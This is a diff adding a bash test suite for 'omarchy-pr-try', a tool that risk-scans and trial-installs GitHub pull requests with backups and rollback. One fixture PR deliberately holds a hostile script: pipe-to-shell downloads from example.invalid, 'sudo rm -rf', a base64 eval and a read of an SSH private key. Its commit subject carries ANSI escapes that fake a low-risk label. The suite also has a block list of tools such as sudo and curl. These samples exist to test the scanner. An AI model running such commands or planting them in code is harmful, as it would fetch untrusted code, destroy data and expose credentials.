@@ -1,0 +1,588 @@
+#!/usr/bin/env bash
+# Tests for omarchy-pr-try. Everything happens in a throwaway directory: a fake
+# GitHub remote, a fake $HOME, and stand-in versions of gh, pacman and the
+# omarchy-* commands. The tests run with their own PATH (the stand-ins plus
+# ordinary system tools), so nothing installed on your machine can run: no real
+# omarchy-snapshot, sudo, gh, pacman or bwrap, whatever this host has.
+#
+#   ./omarchy-pr-try-test [path/to/omarchy-pr-try]
+set -uo pipefail
+
+TOOL=$(readlink -f "${1:-$(dirname "$(readlink -f "$0")")/omarchy-pr-try}")
+[[ -x "$TOOL" ]] || { echo "cannot find an executable omarchy-pr-try at $TOOL"; exit 2; }
+
+T=$(mktemp -d)
+trap 'rm -rf "$T"' EXIT
+export HOME="$T/home"
+export STUB="$T/stub"
+export OMARCHY_PR_REMOTE="file://$T/remote.git"
+export OMARCHY_PR_REPO="test/omarchy"
+export OMARCHY_PR_DIR="$T/work"
+export OMARCHY_PR_STATE="$T/state"
+export OMARCHY_PR_CONF="$T/etc-omarchy.conf"
+
+# A hermetic PATH. Anything that touches the machine, or differs from host to
+# host, is left out. So a tool that is "missing" in a test really is missing,
+# and a real one can never be reached by accident.
+HOST_BWRAP=$(command -v bwrap 2>/dev/null || true)
+blocked() {
+  case "$1" in
+    omarchy|omarchy-*|snapper|bwrap|gh|gum|sudo|doas|pkexec|su|pacman|yay|paru|makepkg) return 0 ;;
+    systemctl|reboot|shutdown|poweroff|halt|curl|wget|shellcheck|wl-copy|wl-paste) return 0 ;;
+    xdg-open|update-desktop-database|notify-send|hyprctl|limine*) return 0 ;;
+  esac
+  return 1
+}
+mkdir -p "$T/sysbin" "$STUB/bin"
+IFS=: read -ra _dirs <<<"$PATH"
+for (( _i = ${#_dirs[@]} - 1; _i >= 0; _i-- )); do   # earlier PATH entries win
+  _d=${_dirs[_i]}
+  [[ -d "$_d" ]] || continue
+  _files=()
+  for _f in "$_d"/*; do
+    [[ -f "$_f" && -x "$_f" ]] || continue
+    blocked "${_f##*/}" || _files+=("$_f")
+  done
+  if (( ${#_files[@]} )); then ln -sf -t "$T/sysbin" "${_files[@]}" 2>/dev/null || true; fi
+done
+export PATH="$STUB/bin:$T/sysbin"
+# Safety net: refuse to run at all if a real one is still reachable.
+for _c in omarchy-snapshot omarchy-dev-link omarchy-dev-unlink omarchy-dev-status omarchy-system-reboot \
+          snapper bwrap gh gum sudo pacman systemctl curl; do
+  _p=$(command -v "$_c" 2>/dev/null || true)
+  if [[ -n "$_p" && "$_p" != "$STUB"/* ]]; then
+    echo "refusing to run: a real '$_c' is reachable at $_p" >&2
+    exit 2
+  fi
+done
+unset OMARCHY_PR_YES OMARCHY_PR_ALLOW_HIGH OMARCHY_PR_ALLOW_NO_SNAPSHOT OMARCHY_PATH
+export GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t
+
+PASS=0; FAIL=0
+pass() { PASS=$((PASS + 1)); printf '  ok   %s\n' "$1"; }
+fail() { FAIL=$((FAIL + 1)); printf '  FAIL %s\n' "$1"; if [[ -n "${2:-}" ]]; then printf '%s\n' "$2" | sed 's/^/       | /' | head -25; fi; }
+section() { printf '\n== %s\n' "$1"; }
+
+# Run the tool; capture output and status.
+OUT=""; RC=0
+run() { OUT=$("$TOOL" "$@" 2>&1 </dev/null); RC=$?; }
+runy() { OUT=$(OMARCHY_PR_YES=1 "$TOOL" "$@" 2>&1 </dev/null); RC=$?; }
+
+expect_rc()       { if [[ $RC == "$1" ]]; then pass "$2"; else fail "$2 (exit $RC, wanted $1)" "$OUT"; fi; }
+expect_has()      { if grep -qF -- "$1" <<<"$OUT"; then pass "${2:-output has: $1}"; else fail "${2:-output has: $1}" "$OUT"; fi; }
+expect_lacks()    { if ! grep -qF -- "$1" <<<"$OUT"; then pass "${2:-output lacks: $1}"; else fail "${2:-output lacks: $1}" "$OUT"; fi; }
+expect() { # description command...
+  local d="$1"; shift
+  if "$@" >/dev/null 2>&1; then pass "$d"; else fail "$d"; fi
+}
+expect_not() { local d="$1"; shift; if ! "$@" >/dev/null 2>&1; then pass "$d"; else fail "$d"; fi; }
+
+# ------------------------------------------------------------ fake world
+
+mkdir -p "$STUB/bin"
+
+# gh: logged in; knows each PR's base from $STUB/bases ("N branch").
+cat >"$STUB/bin/gh" <<'EOF'
+#!/usr/bin/env bash
+case "$1 $2" in
+  "auth status") exit 0 ;;
+  "pr view") b=$(awk -v n="$3" '$1 == n { print $2 }' "$STUB/bases"); printf '%s\tOPEN\tfalse\n' "${b:-dev}" ;;
+  "pr list") cat "$STUB/list.tsv" ;;
+  "api user") echo tester ;;
+  "pr comment") echo "https://github.com/test/omarchy/pull/1#issuecomment-1" ;;
+esac
+EOF
+
+# omarchy-dev-link / unlink: write and remove the conf file. They mention
+# --no-reboot, like the real ones, and log what they were called with.
+cat >"$STUB/bin/omarchy-dev-link" <<'EOF'
+#!/usr/bin/env bash
+# supports --no-reboot
+echo "link $*" >>"$STUB/calls"
+[[ -z "${FAIL_LINK:-}" ]] || exit 1
+printf 'export OMARCHY_PATH="%s"\n' "$1" >"$OMARCHY_PR_CONF"
+EOF
+cat >"$STUB/bin/omarchy-dev-unlink" <<'EOF'
+#!/usr/bin/env bash
+# supports --no-reboot
+echo "unlink $*" >>"$STUB/calls"
+if [[ -f "$STUB/fail-unlink-once" ]]; then rm -f "$STUB/fail-unlink-once"; exit 1; fi
+rm -f "$OMARCHY_PR_CONF"
+EOF
+cat >"$STUB/bin/omarchy-snapshot" <<'EOF'
+#!/usr/bin/env bash
+[[ ! -f "$STUB/no-snapshot" ]] || exit 1
+echo "snapshot $*" >>"$STUB/calls"
+EOF
+printf '#!/usr/bin/env bash\nexit 0\n' >"$STUB/bin/snapper"
+cat >"$STUB/bin/omarchy-version" <<'EOF'
+#!/usr/bin/env bash
+echo 4.0.0-test
+EOF
+# pacman -Q: prints $STUB/pkgs
+cat >"$STUB/bin/pacman" <<'EOF'
+#!/usr/bin/env bash
+[[ "$1" == -Q ]] && cat "$STUB/pkgs"
+EOF
+chmod +x "$STUB"/bin/*
+
+# The remote: master, dev (ahead of master), and a handful of PRs.
+git init -q --bare "$T/remote.git"
+git -C "$T/remote.git" config uploadpack.allowFilter true
+git -C "$T/remote.git" config uploadpack.allowAnySHA1InWant true
+git -C "$T/remote.git" symbolic-ref HEAD refs/heads/master
+W="$T/src"
+git init -q -b master "$W"
+cd "$W" || exit 2
+mkdir -p bin config/waybar test migrations
+printf '#!/usr/bin/env bash\necho base\n' >bin/omarchy-base
+printf 'bar = 1\n' >config/waybar/config
+printf '#!/usr/bin/env bash\nexit 0\n' >test/cli
+chmod +x bin/omarchy-base test/cli
+git add -A; git commit -qm "base"
+git remote add origin "$T/remote.git"
+git push -q origin master
+
+git checkout -q -b dev
+printf '#!/usr/bin/env bash\nsudo true   # only on dev, not part of any PR\n' >bin/omarchy-devonly
+chmod +x bin/omarchy-devonly
+git add -A; git commit -qm "dev only change"
+git push -q origin dev
+
+# PR 1: harmless, on dev. Touches config/waybar.
+git checkout -q -b pr1 dev
+printf 'bar = 2\n' >config/waybar/config
+printf '#!/usr/bin/env bash\necho hello\n' >bin/omarchy-foo
+chmod +x bin/omarchy-foo
+git add -A; git commit -qm "Add foo and tweak the bar"
+git push -q origin pr1:refs/pull/1/head
+
+# PR 2: nasty, on dev. ANSI escape in the commit subject.
+git checkout -q -b pr2 dev
+cat >bin/omarchy-evil <<'EOS'
+#!/usr/bin/env bash
+curl -s http://example.invalid/x | sh
+sudo rm -rf ~/x
+eval "$(echo aGk= | base64 -d)"
+curl http://example.invalid/y \
+  | bash
+cat ~/.ssh/id_ed25519
+EOS
+chmod +x bin/omarchy-evil
+git add -A
+git commit -qm "$(printf 'Harmless\033[2J\033[31m FAKE: risk is LOW\033[0m')"
+git push -q origin pr2:refs/pull/2/head
+
+# PR 3: on master. Migration, binary file, symlink.
+git checkout -q -b pr3 master
+printf 'pacman -S --noconfirm foo\n' >migrations/1700000000.sh
+printf '\000\001\002binary' >data.bin
+ln -s /etc/passwd link
+git add -A; git commit -qm "Migration plus odds and ends"
+git push -q origin pr3:refs/pull/3/head
+
+# PR 4: a script with a syntax error, on dev.
+git checkout -q -b pr4 dev
+printf '#!/usr/bin/env bash\nif then\n' >bin/omarchy-broken
+chmod +x bin/omarchy-broken
+git add -A; git commit -qm "Broken script"
+git push -q origin pr4:refs/pull/4/head
+
+# PR 5: a shell plugin (QML) that starts a process, builds a shell string,
+# fetches from the network and opens a link.
+git checkout -q -b pr5 dev
+mkdir -p shell/plugins/foo
+cat >shell/plugins/foo/Panel.qml <<'EOS'
+import QtQuick
+import Quickshell.Io
+Item {
+  // Process { in a comment must not count
+  Process {
+    command: ["sh", "-c", "echo " + name]
+  }
+  function load() {
+    var x = new XMLHttpRequest()
+    Qt.openUrlExternally("https://example.invalid")
+  }
+}
+EOS
+git add -A; git commit -qm "Add a foo panel"
+git push -q origin pr5:refs/pull/5/head
+
+# PR 6: the same words, but not in QML or JS. The plugin rules must not fire.
+git checkout -q -b pr6 dev
+printf '#!/usr/bin/env bash\nbash -c "echo hi"\n' >bin/omarchy-shellc
+chmod +x bin/omarchy-shellc
+printf 'Process {\nXMLHttpRequest\n' >notes.txt
+git add -A; git commit -qm "Shell script with bash -c"
+git push -q origin pr6:refs/pull/6/head
+cd "$T" || exit 2
+
+printf '1 dev\n2 dev\n3 master\n4 dev\n5 dev\n6 dev\n' >"$STUB/bases"
+printf '1\tAdd foo\talice\t\t+3/-1\tpass\tdev\n2\tNasty\tbob\tdraft\t+9/-0\tfail\tdev\n' >"$STUB/list.tsv"
+
+reset_world() {
+  rm -rf "$HOME" "$OMARCHY_PR_STATE" "$STUB/calls" "$STUB/no-snapshot" "$STUB/fail-unlink-once"
+  rm -f "$OMARCHY_PR_CONF"
+  mkdir -p "$HOME/.config/hypr" "$HOME/.config/omarchy/themes" "$HOME/.config/waybar" "$HOME/.local/state/omarchy"
+  echo "hypr original" >"$HOME/.config/hypr/hyprland.lua"
+  echo "theme original" >"$HOME/.config/omarchy/current-theme"
+  echo "bar original" >"$HOME/.config/waybar/config"
+  echo "state original" >"$HOME/.local/state/omarchy/note"
+  printf 'bash 5.2-1\ngit 2.43-1\nlinux 6.9-1\n' >"$STUB/pkgs"
+  unset FAIL_LINK
+}
+reset_world
+
+# ------------------------------------------------------------ tests
+
+section "list"
+run list
+expect_rc 0 "list works"
+expect_has "#1" "lists PR 1"
+expect_has "→ dev" "shows the base branch"
+
+section "risk: the base branch is the PR's own, not the default"
+run risk 1
+expect_rc 0 "risk 1 runs"
+expect_has "base dev" "base is dev"
+expect_has "Risk: LOW" "PR 1 is LOW"
+expect_lacks "omarchy-devonly" "dev-only commits are not blamed on the PR"
+expect_has "config/waybar/config" "sees its own change"
+expect "reviewed commit is remembered" test -s "$OMARCHY_PR_STATE/reviewed/pr-1"
+
+section "risk: nasty PR, and terminal escapes"
+run risk 2
+expect_has "Risk: HIGH" "PR 2 is HIGH"
+expect_has "pipes a download into a shell" "pipe-to-shell found"
+expect_has "runs commands as root" "sudo found"
+expect_has "decodes a hidden payload" "base64 payload found"
+expect_has "touches SSH or GPG keys" "ssh key access found"
+expect_has "bin/omarchy-evil:7" "line number of the split curl|bash is the first of the two lines"
+if grep -q $'\033' <<<"$OUT"; then fail "no escape characters reach the terminal" "$(printf '%s' "$OUT" | od -c | head -5)"; else pass "no escape characters reach the terminal"; fi
+
+section "risk: base on master, odd files"
+run risk 3
+expect_has "base master" "base is master"
+expect_has "adds or changes a migration" "migration flagged"
+expect_has "symlinks" "symlink flagged"
+expect_has "binary files" "binary file flagged"
+expect_has "Risk: MEDIUM" "PR 3 is MEDIUM"
+
+section "risk: shell plugins (QML) are scanned for what they can do"
+run risk 5
+expect_has "Risk: MEDIUM" "PR 5 is MEDIUM"
+expect_has "starts programs from a QML or JS file" "Process { is flagged"
+expect_has "builds a shell command from a string" "sh -c in a command list is flagged"
+expect_has "network access from a plugin" "XMLHttpRequest is flagged"
+expect_has "opens a link outside the shell" "Qt.openUrlExternally is flagged"
+expect_has "shell/plugins/foo/Panel.qml:6" "points at the Process line, not the comment on line 5"
+run risk 6
+expect_has "Risk: LOW" "PR 6 stays LOW"
+expect_lacks "starts programs from a QML or JS file" "Process { outside QML/JS is not flagged"
+expect_lacks "builds a shell command from a string" "bash -c in a shell script is not flagged by the plugin rule"
+expect_lacks "network access from a plugin" "XMLHttpRequest in a text file is not flagged"
+
+section "risk: guessing the base when GitHub cannot say"
+mv "$STUB/bin/gh" "$STUB/gh.off"
+run risk 1
+mv "$STUB/gh.off" "$STUB/bin/gh"
+expect_has "(guessed)" "says it guessed"
+expect_has "base dev" "guessed dev, the closest branch"
+expect_lacks "omarchy-devonly" "still not blaming the PR for dev's changes"
+
+section "test: checks"
+runy test 4
+expect_rc 1 "a syntax error fails the checks"
+expect_has "syntax error: bin/omarchy-broken" "names the broken script"
+runy test 1
+expect_rc 0 "PR 1 passes"
+expect_has "skipped" "repo tests are skipped without a sandbox (no bubblewrap here)"
+expect_lacks "Checks passed." "does not claim the repo tests passed"
+expect_not "worktree is cleaned up" test -d "$OMARCHY_PR_DIR/wt-1"
+
+if [[ -n "$HOST_BWRAP" ]] && "$HOST_BWRAP" --ro-bind / / --unshare-user true >/dev/null 2>&1; then
+  section "test: the repo's tests run inside the sandbox (this host has a working bubblewrap)"
+  ln -s "$HOST_BWRAP" "$STUB/bin/bwrap"
+  runy test 1
+  expect_rc 0 "PR 1 passes with the sandbox"
+  expect_has "in a sandbox" "the repo's tests ran in the sandbox"
+  expect_has "Checks passed." "and passed"
+  expect_not "worktree is cleaned up" test -d "$OMARCHY_PR_DIR/wt-1"
+  rm -f "$STUB/bin/bwrap"
+else
+  section "test: sandbox (skipped: no working bubblewrap on this host)"
+fi
+
+section "test: the runner's logs are kept outside the sandbox's throwaway /tmp"
+cat >"$STUB/bin/bwrap" <<'EOF'
+#!/usr/bin/env bash
+echo "$*" >>"$STUB/bwrap-calls"
+if [[ -f "$STUB/bwrap-fail" && "$*" == *" ./test/"* ]]; then exit 1; fi
+exit 0
+EOF
+chmod +x "$STUB/bin/bwrap"
+LOGS="$OMARCHY_PR_DIR/test-logs/pr-1"
+runy test 1
+expect_rc 0 "PR 1 passes with a stand-in sandbox"
+expect_has "test logs: $LOGS" "tells you where the logs are"
+expect "the log folder exists after the run" test -d "$LOGS"
+expect "TMPDIR points at it inside the sandbox" grep -qF -- "--setenv TMPDIR $LOGS" "$STUB/bwrap-calls"
+expect "and it is bound writable" grep -qF -- "--bind $LOGS $LOGS" "$STUB/bwrap-calls"
+touch "$STUB/bwrap-fail"
+runy test 1
+expect_rc 1 "a failing repo test fails the checks"
+expect_has "failed. Each test file's log is in $LOGS" "points at the logs"
+expect_has "did not touch" "suggests checking the base branch"
+expect_lacks "display or the network" "no longer blames the sandbox"
+rm -f "$STUB/bwrap-fail" "$STUB/bin/bwrap" "$STUB/bwrap-calls"
+
+section "try / back: the happy path"
+reset_world
+run risk 1
+before=$(cd "$HOME" && tar -cf - .config .local | sha256sum)
+runy try 1
+expect_rc 0 "try 1 succeeds"
+expect_has "backed up" "backed up the config"
+expect_has "Do not run 'omarchy update' while a PR is linked" "warns about omarchy update while linked"
+expect "state file exists" test -f "$OMARCHY_PR_STATE/active"
+expect "dev-link points at the checkout" grep -q "$OMARCHY_PR_DIR/checkout" "$OMARCHY_PR_CONF"
+expect "passes --no-reboot to dev-link" grep -q "link .*--no-reboot" "$STUB/calls"
+expect "took a snapshot" grep -q '^snapshot create' "$STUB/calls"
+expect "derived .config/waybar from the PR's config/ change" grep -qx '.config/waybar' "$OMARCHY_PR_STATE/backup.paths"
+expect "backup is private" test "$(stat -c %a "$OMARCHY_PR_STATE/backup.tar.gz")" = 600
+expect "state dir is private" test "$(stat -c %a "$OMARCHY_PR_STATE")" = 700
+# The PR "changes" things, and you change something yourself while testing.
+echo "pr edited hypr" >"$HOME/.config/hypr/hyprland.lua"
+echo "pr edited bar" >"$HOME/.config/waybar/config"
+echo "my tweak during the test" >"$HOME/.config/omarchy/my-tweak"
+mkdir -p "$HOME/.config/newapp"; echo x >"$HOME/.config/newapp/f"
+printf 'bash 5.2-1\ngit 2.43-1\nlinux 6.9-2\nnewpkg 1.0-1\n' >"$STUB/pkgs"
+run status
+expect_has "PR #1 is active" "status shows PR 1"
+runy try 2
+expect_rc 1 "a second try is refused while one is active"
+runy back
+expect_rc 0 "back succeeds"
+after=$(cd "$HOME" && tar -cf - .config .local 2>/dev/null | sha256sum)
+expect_not "state file is gone" test -f "$OMARCHY_PR_STATE/active"
+expect_not "dev-link is gone" test -f "$OMARCHY_PR_CONF"
+expect "hypr config is back" grep -qx 'hypr original' "$HOME/.config/hypr/hyprland.lua"
+expect "waybar config is back" grep -qx 'bar original' "$HOME/.config/waybar/config"
+expect_not "your tweak is not in the live config any more" test -e "$HOME/.config/omarchy/my-tweak"
+expect "but your tweak is saved, not destroyed" bash -c "find '$OMARCHY_PR_STATE/displaced' -name my-tweak | grep -q ."
+expect "folders outside the backup list are left alone" test -e "$HOME/.config/newapp/f"
+expect "history row written" grep -q $'\t1\t' "$OMARCHY_PR_STATE/history.tsv"
+expect_has "Packages added since you started" "reports added packages"
+expect_has "newpkg" "names the added package"
+expect_has "omarchy-pkg-drop newpkg" "suggests omarchy-pkg-drop"
+expect_lacks "pacman -Rs" "and not a raw pacman -R"
+expect_has "1 packages changed version" "counts version changes"
+expect_has "A system snapshot was taken" "mentions the snapshot"
+if [[ "$before" != "$after" ]]; then
+  # only the my-tweak/newapp state differs from the pristine tree, and those were moved aside
+  pass "(tree differs from before only by what we moved aside)"
+fi
+run history
+expect_has "VERDICT" "history prints a header"
+
+section "back: things the PR created in a backed-up location are moved aside"
+reset_world
+rm -rf "$HOME/.config/waybar"
+runy try 1
+mkdir -p "$HOME/.config/waybar"; echo "created by the PR" >"$HOME/.config/waybar/config"
+runy back
+expect_rc 0 "back works"
+expect_not "the PR's new folder is gone from the live config" test -e "$HOME/.config/waybar"
+expect "but it is saved" bash -c "find '$OMARCHY_PR_STATE/displaced/' -path '*absent*' -name config | grep -q ."
+
+section "try: HIGH risk is a hard stop for scripts"
+reset_world
+runy try 2
+expect_rc 1 "HIGH is refused without a person"
+expect_has "risk is HIGH" "says why"
+expect_not "nothing was switched" test -f "$OMARCHY_PR_CONF"
+expect_not "no state left behind" test -f "$OMARCHY_PR_STATE/active"
+OMARCHY_PR_ALLOW_HIGH=1 runy try 2
+expect_rc 0 "HIGH goes through with the explicit override"
+runy back
+expect_rc 0 "and goes back"
+
+section "try: a snapshot is required for every PR"
+reset_world
+touch "$STUB/no-snapshot"
+runy try 1
+expect_rc 1 "LOW without a snapshot is refused"
+expect_has "no system snapshot" "and says why"
+expect_has "Limine" "and says snapshots need the Limine bootloader"
+expect_not "nothing was switched" test -f "$OMARCHY_PR_CONF"
+expect_not "no state left behind" test -f "$OMARCHY_PR_STATE/active"
+expect_not "dev-link was never called" grep -q '^link' "$STUB/calls"
+runy try 3
+expect_rc 1 "MEDIUM without a snapshot is refused"
+OMARCHY_PR_ALLOW_HIGH=1 runy try 2
+expect_rc 1 "HIGH without a snapshot is refused"
+expect_not "still nothing switched" test -f "$OMARCHY_PR_CONF"
+rm -f "$STUB/no-snapshot"
+mv "$STUB/bin/omarchy-snapshot" "$STUB/omarchy-snapshot.off"
+runy try 1
+expect_rc 1 "a missing omarchy-snapshot is refused before any prompt"
+expect_has "omarchy-snapshot not found" "and says what is missing"
+expect_not "nothing was switched" test -f "$OMARCHY_PR_CONF"
+run doctor
+expect_has "every try will be refused" "doctor flags the missing snapshot tool"
+expect_has "Limine" "doctor says snapshots need Limine"
+mv "$STUB/omarchy-snapshot.off" "$STUB/bin/omarchy-snapshot"
+reset_world
+touch "$STUB/no-snapshot"
+OMARCHY_PR_ALLOW_NO_SNAPSHOT=1 runy try 1
+expect_rc 0 "the explicit override still works"
+expect_has "WITHOUT a snapshot" "and warns about it"
+runy back
+expect_has "No system snapshot was taken" "back reminds you there was none"
+
+section "try: a failing dev-link is rolled back"
+reset_world
+FAIL_LINK=1 runy try 1
+expect_rc 1 "try fails"
+expect_not "no state left behind" test -f "$OMARCHY_PR_STATE/active"
+expect_not "no dev-link left behind" test -f "$OMARCHY_PR_CONF"
+expect "config untouched" grep -qx 'hypr original' "$HOME/.config/hypr/hyprland.lua"
+
+section "back: survives a failed unlink and can be re-run"
+reset_world
+runy try 1
+echo "pr edited" >"$HOME/.config/hypr/hyprland.lua"
+touch "$STUB/fail-unlink-once"
+runy back
+expect_rc 1 "back fails when unlink fails"
+expect "state is kept" test -f "$OMARCHY_PR_STATE/active"
+expect "config is NOT touched yet" grep -qx 'pr edited' "$HOME/.config/hypr/hyprland.lua"
+runy back
+expect_rc 0 "second back succeeds"
+expect "config is restored" grep -qx 'hypr original' "$HOME/.config/hypr/hyprland.lua"
+
+section "back: re-running after a restore does not clobber newer changes"
+reset_world
+runy try 1
+# simulate a crash after the restore step: phase=restored, ACTIVE kept
+"$TOOL" back </dev/null >/dev/null 2>&1 || true
+reset_world
+runy try 1
+sed -i 's/^phase=.*/phase=restored/' "$OMARCHY_PR_STATE/active"
+rm -f "$OMARCHY_PR_CONF"
+echo "my newer edit" >"$HOME/.config/hypr/hyprland.lua"
+runy back
+expect_rc 0 "finishes without restoring again"
+expect "newer edit survives" grep -qx 'my newer edit' "$HOME/.config/hypr/hyprland.lua"
+
+section "back: refuses a tampered backup"
+reset_world
+runy try 1
+echo tamper >>"$OMARCHY_PR_STATE/backup.tar.gz"
+runy back
+expect_rc 1 "checksum mismatch stops back"
+expect_has "checksum" "says why"
+expect "state is kept" test -f "$OMARCHY_PR_STATE/active"
+expect "dev-link is not removed on a bad backup" test -f "$OMARCHY_PR_CONF"
+
+section "back: refuses unsafe paths in its own lists"
+reset_world
+runy try 1
+echo '../../etc' >>"$OMARCHY_PR_STATE/backup.paths"
+runy back
+expect_rc 1 "a '../' path stops back"
+expect_has "will not touch" "says why"
+reset_world
+runy try 1
+printf '.ssh\n' >>"$OMARCHY_PR_STATE/backup.absent"
+runy back
+expect_rc 1 "a protected path in the absent list stops back"
+
+section "back: your earlier dev-link comes back"
+reset_world
+mkdir -p "$T/my-dev-checkout"
+printf 'export OMARCHY_PATH="%s"\n' "$T/my-dev-checkout" >"$OMARCHY_PR_CONF"
+runy try 1
+expect_has "you already have a dev-link" "noticed the existing link"
+expect "link now points at the PR" grep -q "$OMARCHY_PR_DIR/checkout" "$OMARCHY_PR_CONF"
+runy back
+expect_rc 0 "back works"
+expect "link points at your own checkout again" grep -q "$T/my-dev-checkout" "$OMARCHY_PR_CONF"
+
+section "try: the PR changed after you reviewed it"
+reset_world
+run risk 1
+# the author pushes again
+git -C "$W" checkout -q pr1
+echo '# sneaky' >>"$W/bin/omarchy-foo"
+git -C "$W" commit -qam "late change"
+git -C "$W" push -q origin pr1:refs/pull/1/head
+runy try 1
+expect_has "changed since you reviewed" "warns"
+expect_has "late change" "shows what is new"
+expect_has "cancelled" "and does not continue without a person"
+expect_not "nothing was switched" test -f "$OMARCHY_PR_CONF"
+new=$(git -C "$W" rev-parse HEAD)
+runy try 1 "${new:0:7}"
+expect_has "changed since you reviewed" "a matching SHA does not skip the review warning"
+runy try 1 deadbee
+expect_rc 1 "a SHA that does not match is refused"
+expect_has "It changed" "says the PR moved"
+rm -f "$OMARCHY_PR_STATE/reviewed/pr-1"
+runy try 1 "${new:0:7}"
+expect_rc 0 "an unreviewed PR can be tried with the pinned SHA"
+runy back
+
+section "lock"
+reset_world
+mkdir -p "$OMARCHY_PR_STATE"
+( exec 8>"$OMARCHY_PR_STATE/lock"; flock -n 8; sleep 5 ) &
+holder=$!
+sleep 0.5
+runy try 1
+expect_rc 1 "a second run is refused while one holds the lock"
+expect_has "already running" "says why"
+kill "$holder" 2>/dev/null; wait "$holder" 2>/dev/null
+
+section "clean"
+reset_world
+runy try 1
+runy clean
+expect_rc 1 "clean refuses while a PR is active"
+runy back
+runy clean
+expect_rc 0 "clean works after back"
+expect_not "checkout is gone" test -d "$OMARCHY_PR_DIR/checkout"
+expect_not "backup is gone" test -f "$OMARCHY_PR_STATE/backup.tar.gz"
+expect "history is kept" test -s "$OMARCHY_PR_STATE/history.tsv"
+expect "your saved copies are kept without a person to ask" test -d "$OMARCHY_PR_STATE/displaced"
+OMARCHY_PR_DIR="$HOME" runy clean
+expect_rc 1 "clean refuses to delete \$HOME"
+mkdir -p "$T/not-ours"; echo keep >"$T/not-ours/file"
+OMARCHY_PR_DIR="$T/not-ours" runy clean
+expect_rc 1 "clean refuses a folder it did not create"
+expect "and leaves it alone" test -f "$T/not-ours/file"
+
+section "doctor / misc"
+run doctor
+expect_rc 0 "doctor runs"
+expect_has "dev-link supports --no-reboot" "doctor sees the flag"
+expect_has "omarchy-pkg-add bubblewrap" "doctor suggests omarchy-pkg-add for bubblewrap"
+expect_lacks "pacman -S bubblewrap" "and not a raw pacman"
+run install
+expect_rc 0 "install runs"
+expect_has "~/.config/hypr/bindings.lua" "the keybinding hint names the Lua bindings file"
+expect_has 'o.bind("SUPER + SHIFT + <key>", "Try an Omarchy PR"' "and uses the o.bind format"
+expect_has "omarchy menu keybindings --print" "and tells you to look for a free key first"
+expect_lacks "bindd" "and not the old hyprlang syntax"
+run version
+expect_has "omarchy-pr-try 0." "version prints"
+run --help
+expect_has "omarchy-pr-try try N" "help prints"
+expect_lacks "Environment" "help stops before the environment notes"
+run risk abc
+expect_rc 1 "a non-number PR is rejected"
+
+printf '\n%d passed, %d failed\n' "$PASS" "$FAIL"
+(( FAIL == 0 ))
